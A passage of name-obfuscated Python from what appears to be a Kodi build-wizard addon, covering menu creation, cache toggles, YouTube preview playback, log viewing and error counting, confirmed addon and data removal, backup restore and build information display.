		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO0OOOO00O00O00OO +'")')#line:4148
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4149
def createMenu (O00OO0OO0O0OO000O ,OOO000000OO00O0OO ,OO000O000O00O000O ):#line:4155
	if O00OO0OO0O0OO000O =='saveaddon':#line:4156
		O0O00OOOOOO0000OO =[]#line:4157
		OO00O0O00000OO0OO =urllib .quote_plus (OOO000000OO00O0OO .lower ().replace (' ',''))#line:4158
		OO0O0O0000000O0O0 =OOO000000OO00O0OO .replace ('Debrid','Real Debrid')#line:4159
		OOOO00O0O00OOOO00 =urllib .quote_plus (OO000O000O00O000O .lower ().replace (' ',''))#line:4160
		OO000O000O00O000O =OO000O000O00O000O .replace ('url','URL Resolver')#line:4161
		O0O00OOOOOO0000OO .append ((THEME2 %OO000O000O00O000O .title (),' '))#line:4162
		O0O00OOOOOO0000OO .append ((THEME3 %'Save %s Data'%OO0O0O0000000O0O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO00O0O00000OO0OO ,OOOO00O0O00OOOO00 )))#line:4163
		O0O00OOOOOO0000OO .append ((THEME3 %'Restore %s Data'%OO0O0O0000000O0O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO00O0O00000OO0OO ,OOOO00O0O00OOOO00 )))#line:4164
		O0O00OOOOOO0000OO .append ((THEME3 %'Clear %s Data'%OO0O0O0000000O0O0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO00O0O00000OO0OO ,OOOO00O0O00OOOO00 )))#line:4165
	elif O00OO0OO0O0OO000O =='save':#line:4166
		O0O00OOOOOO0000OO =[]#line:4167
		OO00O0O00000OO0OO =urllib .quote_plus (OOO000000OO00O0OO .lower ().replace (' ',''))#line:4168
		OO0O0O0000000O0O0 =OOO000000OO00O0OO .replace ('Debrid','Real Debrid')#line:4169
		OOOO00O0O00OOOO00 =urllib .quote_plus (OO000O000O00O000O .lower ().replace (' ',''))#line:4170
		OO000O000O00O000O =OO000O000O00O000O .replace ('url','URL Resolver')#line:4171
		O0O00OOOOOO0000OO .append ((THEME2 %OO000O000O00O000O .title (),' '))#line:4172
		O0O00OOOOOO0000OO .append ((THEME3 %'Register %s'%OO0O0O0000000O0O0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO00O0O00000OO0OO ,OOOO00O0O00OOOO00 )))#line:4173
		O0O00OOOOOO0000OO .append ((THEME3 %'Save %s Data'%OO0O0O0000000O0O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO00O0O00000OO0OO ,OOOO00O0O00OOOO00 )))#line:4174
		O0O00OOOOOO0000OO .append ((THEME3 %'Restore %s Data'%OO0O0O0000000O0O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO00O0O00000OO0OO ,OOOO00O0O00OOOO00 )))#line:4175
		O0O00OOOOOO0000OO .append ((THEME3 %'Import %s Data'%OO0O0O0000000O0O0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO00O0O00000OO0OO ,OOOO00O0O00OOOO00 )))#line:4176
		O0O00OOOOOO0000OO .append ((THEME3 %'Clear Addon %s Data'%OO0O0O0000000O0O0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO00O0O00000OO0OO ,OOOO00O0O00OOOO00 )))#line:4177
	elif O00OO0OO0O0OO000O =='install':#line:4178
		O0O00OOOOOO0000OO =[]#line:4179
		OOOO00O0O00OOOO00 =urllib .quote_plus (OO000O000O00O000O )#line:4180
		O0O00OOOOOO0000OO .append ((THEME2 %OO000O000O00O000O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OOOO00O0O00OOOO00 )))#line:4181
		O0O00OOOOOO0000OO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OOOO00O0O00OOOO00 )))#line:4182
		O0O00OOOOOO0000OO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OOOO00O0O00OOOO00 )))#line:4183
		O0O00OOOOOO0000OO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OOOO00O0O00OOOO00 )))#line:4184
		O0O00OOOOOO0000OO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OOOO00O0O00OOOO00 )))#line:4185
	O0O00OOOOOO0000OO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4186
	return O0O00OOOOOO0000OO #line:4187
def toggleCache (OOO0OOOOOOO0O00O0 ):#line:4189
	O0O00O000O0OOO00O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4190
	OO0OO0O00O0O00OO0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4191
	if OOO0OOOOOOO0O00O0 in ['true','false']:#line:4192
		for O000O0O0O00O0O0O0 in O0O00O000O0OOO00O :#line:4193
			wiz .setS (O000O0O0O00O0O0O0 ,OOO0OOOOOOO0O00O0 )#line:4194
	else :#line:4195
		if not OOO0OOOOOOO0O00O0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4196
			try :#line:4197
				O000O0O0O00O0O0O0 =OO0OO0O00O0O00OO0 [O0O00O000O0OOO00O .index (OOO0OOOOOOO0O00O0 )]#line:4198
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O000O0O0O00O0O0O0 ))#line:4199
			except :#line:4200
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOO0OOOOOOO0O00O0 ))#line:4201
		else :#line:4202
			OOOO00O0O0OO000O0 ='true'if wiz .getS (OOO0OOOOOOO0O00O0 )=='false'else 'false'#line:4203
			wiz .setS (OOO0OOOOOOO0O00O0 ,OOOO00O0O0OO000O0 )#line:4204
def playVideo (O00OO0OO0O00O000O ):#line:4206
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O00OO0OO0O00O000O )#line:4207
	if 'watch?v='in O00OO0OO0O00O000O :#line:4208
		OO0OO0O0O0OOO00OO ,OO0000O0O0000OO00 =O00OO0OO0O00O000O .split ('?')#line:4209
		O0OO0O0OOO00OOO00 =OO0000O0O0000OO00 .split ('&')#line:4210
		for OO00OOOOO00000O0O in O0OO0O0OOO00OOO00 :#line:4211
			if OO00OOOOO00000O0O .startswith ('v='):#line:4212
				O00OO0OO0O00O000O =OO00OOOOO00000O0O [2 :]#line:4213
				break #line:4214
			else :continue #line:4215
	elif 'embed'in O00OO0OO0O00O000O or 'youtu.be'in O00OO0OO0O00O000O :#line:4216
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O00OO0OO0O00O000O )#line:4217
		OO0OO0O0O0OOO00OO =O00OO0OO0O00O000O .split ('/')#line:4218
		if len (OO0OO0O0O0OOO00OO [-1 ])>5 :#line:4219
			O00OO0OO0O00O000O =OO0OO0O0O0OOO00OO [-1 ]#line:4220
		elif len (OO0OO0O0O0OOO00OO [-2 ])>5 :#line:4221
			O00OO0OO0O00O000O =OO0OO0O0O0OOO00OO [-2 ]#line:4222
	wiz .log ("YouTube URL: %s"%O00OO0OO0O00O000O )#line:4223
	yt .PlayVideo (O00OO0OO0O00O000O )#line:4224
def viewLogFile ():#line:4226
	OO0O0O00OOOOOO000 =wiz .Grab_Log (True )#line:4227
	OO0O00000O00O00O0 =wiz .Grab_Log (True ,True )#line:4228
	O0OOOO0O0O0OO0000 =0 ;O0O0OOOO0000000OO =OO0O0O00OOOOOO000 #line:4229
	if not OO0O00000O00O00O0 ==False and not OO0O0O00OOOOOO000 ==False :#line:4230
		O0OOOO0O0O0OO0000 =DIALOG .select (ADDONTITLE ,["View %s"%OO0O0O00OOOOOO000 .replace (LOG ,""),"View %s"%OO0O00000O00O00O0 .replace (LOG ,"")])#line:4231
		if O0OOOO0O0O0OO0000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4232
	elif OO0O0O00OOOOOO000 ==False and OO0O00000O00O00O0 ==False :#line:4233
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4234
		return #line:4235
	elif not OO0O0O00OOOOOO000 ==False :O0OOOO0O0O0OO0000 =0 #line:4236
	elif not OO0O00000O00O00O0 ==False :O0OOOO0O0O0OO0000 =1 #line:4237
	O0O0OOOO0000000OO =OO0O0O00OOOOOO000 if O0OOOO0O0O0OO0000 ==0 else OO0O00000O00O00O0 #line:4239
	O00O0O000000OOO0O =wiz .Grab_Log (False )if O0OOOO0O0O0OO0000 ==0 else wiz .Grab_Log (False ,True )#line:4240
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0O0OOOO0000000OO ),O00O0O000000OOO0O )#line:4242
def errorChecking (log =None ,count =None ,all =None ):#line:4244
	if log ==None :#line:4245
		OOO0O00000OOO00OO =wiz .Grab_Log (True )#line:4246
		O00OO00OOO0OO0OO0 =wiz .Grab_Log (True ,True )#line:4247
		if not O00OO00OOO0OO0OO0 ==False and not OOO0O00000OOO00OO ==False :#line:4248
			O0O0O00O0OO0000OO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OOO0O00000OOO00OO .replace (LOG ,""),errorChecking (OOO0O00000OOO00OO ,True ,True )),"View %s: %s error(s)"%(O00OO00OOO0OO0OO0 .replace (LOG ,""),errorChecking (O00OO00OOO0OO0OO0 ,True ,True ))])#line:4249
			if O0O0O00O0OO0000OO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4250
		elif OOO0O00000OOO00OO ==False and O00OO00OOO0OO0OO0 ==False :#line:4251
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4252
			return #line:4253
		elif not OOO0O00000OOO00OO ==False :O0O0O00O0OO0000OO =0 #line:4254
		elif not O00OO00OOO0OO0OO0 ==False :O0O0O00O0OO0000OO =1 #line:4255
		log =OOO0O00000OOO00OO if O0O0O00O0OO0000OO ==0 else O00OO00OOO0OO0OO0 #line:4256
	if log ==False :#line:4257
		if count ==None :#line:4258
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4259
			return False #line:4260
		else :#line:4261
			return 0 #line:4262
	else :#line:4263
		if os .path .exists (log ):#line:4264
			O0000O0O0O0O00O0O =open (log ,mode ='r');OOO0000OOOOOOOOO0 =O0000O0O0O0O00O0O .read ().replace ('\n','').replace ('\r','');O0000O0O0O0O00O0O .close ()#line:4265
			O00OO0O0OO000O0O0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO0000OOOOOOOOO0 )#line:4266
			if not count ==None :#line:4267
				if all ==None :#line:4268
					OO000OOOO0OOO0O0O =0 #line:4269
					for O0O0O0O0OOO0O0OO0 in O00OO0O0OO000O0O0 :#line:4270
						if ADDON_ID in O0O0O0O0OOO0O0OO0 :OO000OOOO0OOO0O0O +=1 #line:4271
					return OO000OOOO0OOO0O0O #line:4272
				else :return len (O00OO0O0OO000O0O0 )#line:4273
			if len (O00OO0O0OO000O0O0 )>0 :#line:4274
				OO000OOOO0OOO0O0O =0 ;OOO0O0O00OOO0O00O =""#line:4275
				for O0O0O0O0OOO0O0OO0 in O00OO0O0OO000O0O0 :#line:4276
					if all ==None and not ADDON_ID in O0O0O0O0OOO0O0OO0 :continue #line:4277
					else :#line:4278
						OO000OOOO0OOO0O0O +=1 #line:4279
						OOO0O0O00OOO0O00O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OO000OOOO0OOO0O0O ,O0O0O0O0OOO0O0OO0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4280
				if OO000OOOO0OOO0O0O >0 :#line:4281
					wiz .TextBox (ADDONTITLE ,OOO0O0O00OOO0O00O )#line:4282
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4283
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4284
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4285
ACTION_PREVIOUS_MENU =10 #line:4287
ACTION_NAV_BACK =92 #line:4288
ACTION_MOVE_LEFT =1 #line:4289
ACTION_MOVE_RIGHT =2 #line:4290
ACTION_MOVE_UP =3 #line:4291
ACTION_MOVE_DOWN =4 #line:4292
ACTION_MOUSE_WHEEL_UP =104 #line:4293
ACTION_MOUSE_WHEEL_DOWN =105 #line:4294
ACTION_MOVE_MOUSE =107 #line:4295
ACTION_SELECT_ITEM =7 #line:4296
ACTION_BACKSPACE =110 #line:4297
ACTION_MOUSE_LEFT_CLICK =100 #line:4298
ACTION_MOUSE_LONG_CLICK =108 #line:4299
def LogViewer (default =None ):#line:4301
	class O0O0OO000OOO0OOO0 (xbmcgui .WindowXMLDialog ):#line:4302
		def __init__ (OOOO0000O0OO00OO0 ,*OO00OO00OO0O0OOO0 ,**OOOOOOO0O0O000O00 ):#line:4303
			OOOO0000O0OO00OO0 .default =OOOOOOO0O0O000O00 ['default']#line:4304
		def onInit (O00OO0O0O00OOO0OO ):#line:4306
			O00OO0O0O00OOO0OO .title =101 #line:4307
			O00OO0O0O00OOO0OO .msg =102 #line:4308
			O00OO0O0O00OOO0OO .scrollbar =103 #line:4309
			O00OO0O0O00OOO0OO .upload =201 #line:4310
			O00OO0O0O00OOO0OO .kodi =202 #line:4311
			O00OO0O0O00OOO0OO .kodiold =203 #line:4312
			O00OO0O0O00OOO0OO .wizard =204 #line:4313
			O00OO0O0O00OOO0OO .okbutton =205 #line:4314
			O0O000OOOO00OO0OO =open (O00OO0O0O00OOO0OO .default ,'r')#line:4315
			O00OO0O0O00OOO0OO .logmsg =O0O000OOOO00OO0OO .read ()#line:4316
			O0O000OOOO00OO0OO .close ()#line:4317
			O00OO0O0O00OOO0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O00OO0O0O00OOO0OO .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4318
			O00OO0O0O00OOO0OO .showdialog ()#line:4319
		def showdialog (O0OO000O00O00O0OO ):#line:4321
			O0OO000O00O00O0OO .getControl (O0OO000O00O00O0OO .title ).setLabel (O0OO000O00O00O0OO .titlemsg )#line:4322
			O0OO000O00O00O0OO .getControl (O0OO000O00O00O0OO .msg ).setText (wiz .highlightText (O0OO000O00O00O0OO .logmsg ))#line:4323
			O0OO000O00O00O0OO .setFocusId (O0OO000O00O00O0OO .scrollbar )#line:4324
		def onClick (O0000OOOO0OO00O00 ,OO00OOOO0OOOOO000 ):#line:4326
			if OO00OOOO0OOOOO000 ==O0000OOOO0OO00O00 .okbutton :O0000OOOO0OO00O00 .close ()#line:4327
			elif OO00OOOO0OOOOO000 ==O0000OOOO0OO00O00 .upload :O0000OOOO0OO00O00 .close ();uploadLog .Main ()#line:4328
			elif OO00OOOO0OOOOO000 ==O0000OOOO0OO00O00 .kodi :#line:4329
				O0OOO0000O00O0000 =wiz .Grab_Log (False )#line:4330
				O00O0O0OO0O00O000 =wiz .Grab_Log (True )#line:4331
				if O0OOO0000O00O0000 ==False :#line:4332
					O0000OOOO0OO00O00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4333
					O0000OOOO0OO00O00 .getControl (O0000OOOO0OO00O00 .msg ).setText ("Log File Does Not Exists!")#line:4334
				else :#line:4335
					O0000OOOO0OO00O00 .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0O0OO0O00O000 .replace (LOG ,''))#line:4336
					O0000OOOO0OO00O00 .getControl (O0000OOOO0OO00O00 .title ).setLabel (O0000OOOO0OO00O00 .titlemsg )#line:4337
					O0000OOOO0OO00O00 .getControl (O0000OOOO0OO00O00 .msg ).setText (wiz .highlightText (O0OOO0000O00O0000 ))#line:4338
					O0000OOOO0OO00O00 .setFocusId (O0000OOOO0OO00O00 .scrollbar )#line:4339
			elif OO00OOOO0OOOOO000 ==O0000OOOO0OO00O00 .kodiold :#line:4340
				O0OOO0000O00O0000 =wiz .Grab_Log (False ,True )#line:4341
				O00O0O0OO0O00O000 =wiz .Grab_Log (True ,True )#line:4342
				if O0OOO0000O00O0000 ==False :#line:4343
					O0000OOOO0OO00O00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4344
					O0000OOOO0OO00O00 .getControl (O0000OOOO0OO00O00 .msg ).setText ("Log File Does Not Exists!")#line:4345
				else :#line:4346
					O0000OOOO0OO00O00 .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0O0OO0O00O000 .replace (LOG ,''))#line:4347
					O0000OOOO0OO00O00 .getControl (O0000OOOO0OO00O00 .title ).setLabel (O0000OOOO0OO00O00 .titlemsg )#line:4348
					O0000OOOO0OO00O00 .getControl (O0000OOOO0OO00O00 .msg ).setText (wiz .highlightText (O0OOO0000O00O0000 ))#line:4349
					O0000OOOO0OO00O00 .setFocusId (O0000OOOO0OO00O00 .scrollbar )#line:4350
			elif OO00OOOO0OOOOO000 ==O0000OOOO0OO00O00 .wizard :#line:4351
				O0OOO0000O00O0000 =wiz .Grab_Log (False ,False ,True )#line:4352
				O00O0O0OO0O00O000 =wiz .Grab_Log (True ,False ,True )#line:4353
				if O0OOO0000O00O0000 ==False :#line:4354
					O0000OOOO0OO00O00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4355
					O0000OOOO0OO00O00 .getControl (O0000OOOO0OO00O00 .msg ).setText ("Log File Does Not Exists!")#line:4356
				else :#line:4357
					O0000OOOO0OO00O00 .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0O0OO0O00O000 .replace (ADDONDATA ,''))#line:4358
					O0000OOOO0OO00O00 .getControl (O0000OOOO0OO00O00 .title ).setLabel (O0000OOOO0OO00O00 .titlemsg )#line:4359
					O0000OOOO0OO00O00 .getControl (O0000OOOO0OO00O00 .msg ).setText (wiz .highlightText (O0OOO0000O00O0000 ))#line:4360
					O0000OOOO0OO00O00 .setFocusId (O0000OOOO0OO00O00 .scrollbar )#line:4361
		def onAction (OOOO00O0OOOOOO0OO ,O00O00OO0000O000O ):#line:4363
			if O00O00OO0000O000O ==ACTION_PREVIOUS_MENU :OOOO00O0OOOOOO0OO .close ()#line:4364
			elif O00O00OO0000O000O ==ACTION_NAV_BACK :OOOO00O0OOOOOO0OO .close ()#line:4365
	if default ==None :default =wiz .Grab_Log (True )#line:4366
	O00OOOO00000OOO0O =O0O0OO000OOO0OOO0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4367
	O00OOOO00000OOO0O .doModal ()#line:4368
	del O00OOOO00000OOO0O #line:4369
def removeAddon (OOO0OO0OOO0000O00 ,O0000O0O00000OOOO ,over =False ):#line:4371
	if not over ==False :#line:4372
		OOOOOOOOO0000OO0O =1 #line:4373
	else :#line:4374
		OOOOOOOOO0000OO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0000O0O00000OOOO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OOO0OO0OOO0000O00 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4375
	if OOOOOOOOO0000OO0O ==1 :#line:4376
		O0OO0OO000O000O0O =os .path .join (ADDONS ,OOO0OO0OOO0000O00 )#line:4377
		wiz .log ("Removing Addon %s"%OOO0OO0OOO0000O00 )#line:4378
		wiz .cleanHouse (O0OO0OO000O000O0O )#line:4379
		xbmc .sleep (1000 )#line:4380
		try :shutil .rmtree (O0OO0OO000O000O0O )#line:4381
		except Exception as OOOOOO00OO000O0OO :wiz .log ("Error removing %s"%OOO0OO0OOO0000O00 ,xbmc .LOGNOTICE )#line:4382
		removeAddonData (OOO0OO0OOO0000O00 ,O0000O0O00000OOOO ,over )#line:4383
	if over ==False :#line:4384
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0000O0O00000OOOO ))#line:4385
def removeAddonData (O0OOO0O0OO0OO0000 ,name =None ,over =False ):#line:4387
	if O0OOO0O0OO0OO0000 =='all':#line:4388
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4389
			wiz .cleanHouse (ADDOND )#line:4390
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4391
	elif O0OOO0O0OO0OO0000 =='uninstalled':#line:4392
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4393
			O0O0OO00000OO000O =0 #line:4394
			for O000O0O000O0000OO in glob .glob (os .path .join (ADDOND ,'*')):#line:4395
				OOOOOOO0OOOO0O0OO =O000O0O000O0000OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4396
				if OOOOOOO0OOOO0O0OO in EXCLUDES :pass #line:4397
				elif os .path .exists (os .path .join (ADDONS ,OOOOOOO0OOOO0O0OO )):pass #line:4398
				else :wiz .cleanHouse (O000O0O000O0000OO );O0O0OO00000OO000O +=1 ;wiz .log (O000O0O000O0000OO );shutil .rmtree (O000O0O000O0000OO )#line:4399
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O0OO00000OO000O ))#line:4400
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4401
	elif O0OOO0O0OO0OO0000 =='empty':#line:4402
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4403
			O0O0OO00000OO000O =wiz .emptyfolder (ADDOND )#line:4404
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O0OO00000OO000O ))#line:4405
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4406
	else :#line:4407
		OOOO0O0O0OOO0OO0O =os .path .join (USERDATA ,'addon_data',O0OOO0O0OO0OO0000 )#line:4408
		if O0OOO0O0OO0OO0000 in EXCLUDES :#line:4409
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4410
		elif os .path .exists (OOOO0O0O0OOO0OO0O ):#line:4411
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOO0O0OO0OO0000 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4412
				wiz .cleanHouse (OOOO0O0O0OOO0OO0O )#line:4413
				try :#line:4414
					shutil .rmtree (OOOO0O0O0OOO0OO0O )#line:4415
				except :#line:4416
					wiz .log ("Error deleting: %s"%OOOO0O0O0OOO0OO0O )#line:4417
			else :#line:4418
				wiz .log ('Addon data for %s was not removed'%O0OOO0O0OO0OO0000 )#line:4419
	wiz .refresh ()#line:4420
def restoreit (O000OO0O0O0OO0OO0 ):#line:4422
	if O000OO0O0O0OO0OO0 =='build':#line:4423
		OO0OO00O0OOOO0O0O =freshStart ('restore')#line:4424
		if OO0OO00O0OOOO0O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4425
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4426
		wiz .skinToDefault ()#line:4427
	wiz .restoreLocal (O000OO0O0O0OO0OO0 )#line:4428
def restoreextit (O0O00O0OOO00O0OO0 ):#line:4430
	if O0O00O0OOO00O0OO0 =='build':#line:4431
		OO0O00O0OOO00O000 =freshStart ('restore')#line:4432
		if OO0O00O0OOO00O000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4433
	wiz .restoreExternal (O0O00O0OOO00O0OO0 )#line:4434
def buildInfo (OO00000OO0O00O00O ):#line:4436
	if wiz .workingURL (SPEEDFILE )==True :#line:4437
		if wiz .checkBuild (OO00000OO0O00O00O ,'url'):#line:4438
			OO00000OO0O00O00O ,OOOO0O0000O00O000 ,O0O00000O0OOOO0OO ,OOOO00OO0O00OOO0O ,O0OO000O0OOOO0O00 ,O0O00O0OOO0000O00 ,OO00OOO0OO000000O ,OOO0O0OO0OOO0O00O ,OO000OO0000O0OOO0 ,OOOO000O0O0O0O000 ,OO000OOOO000O00OO =wiz .checkBuild (OO00000OO0O00O00O ,'all')#line:4439
			OOOO000O0O0O0O000 ='Yes'if OOOO000O0O0O0O000 .lower ()=='yes'else 'No'#line:4440
			O000OOOO000O0000O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00000OO0O00O00O )#line:4441
			O000OOOO000O0000O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO0O0000O00O000 )#line:4442
			if not O0O00O0OOO0000O00 =="http://":#line:4443
				O000OOO0000OO0O00 =wiz .themeCount (OO00000OO0O00O00O ,False )#line:4444
				O000OOOO000O0000O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O000OOO0000OO0O00 ))#line:4445
			O000OOOO000O0000O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO000O0OOOO0O00 )#line:4446
			O000OOOO000O0000O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO000O0O0O0O000 )#line:4447
			O000OOOO000O0000O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO000OOOO000O00OO )#line:4448
			wiz .TextBox (ADDONTITLE ,O000OOOO000O0000O )#line:4449
		else :wiz .log ("Invalid Build Name!")#line:4450
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4451
def buildVideo (OO0OO0OOOOOO0OOOO ):#line:4453
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4454
	if wiz .workingURL (SPEEDFILE )==True :#line:4455
		O00OO0OOO00O0OO00 =wiz .checkBuild (OO0OO0OOOOOO0OOOO ,'preview')#line:4456
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OO0OO0OOOOOO0OOOO )#line:4457
		if O00OO0OOO00O0OO00 and not O00OO0OOO00O0OO00 =='http://':playVideo (O00OO0OOO00O0OO00 )#line:4458
		else :wiz .log ("[%s]Unable to find url for video preview"%OO0OO0OOOOOO0OOOO )#line:4459
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4460
def dependsList (O00OOOO0O00O00O0O ):#line:4462
